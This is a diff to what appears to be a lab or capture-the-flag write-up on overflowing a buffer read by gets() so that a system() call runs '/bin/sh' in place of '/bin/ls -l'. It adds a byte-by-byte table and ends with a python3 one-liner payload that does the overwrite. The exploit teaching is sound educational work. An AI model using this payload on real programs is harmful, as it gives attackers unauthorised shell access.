@@ -89,6 +89,13 @@ Considering the presence of the gets function, we can, in theory, overflow the a
 | (space)      | —          | (space)     | Ignored by system() |
 | \x00         | —          | \x00        | Old terminator      |
 
+| Field        | 0    | 1 | 2 | 3 | 4 | 5 | 6 | 7       | 8 | 9 | 10      | 11    |
+| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | 
+| Original cmd | /    | b | i | n | / | l | s | (space) | - | l | (space) | \x00  |
+| Your Input   | /    | b | i | n | / | s | h | \x00    | — | — | —       | —     |
+| Final State  | /    | b | i | n | / | s | h | \x00    | - | l | (space) | \x00  |
+| Logic        | same | same | same | same | same | Changed | Changed | Null Terminator | Ignored | Ignored | Ignored | Old terminator |
+
 Our payload looks like this now.
 ```
 python3 -c "import sys; sys.stdout.buffer.write(b'\x00' + b'A' * 47 + b'/bin/sh\x00')"
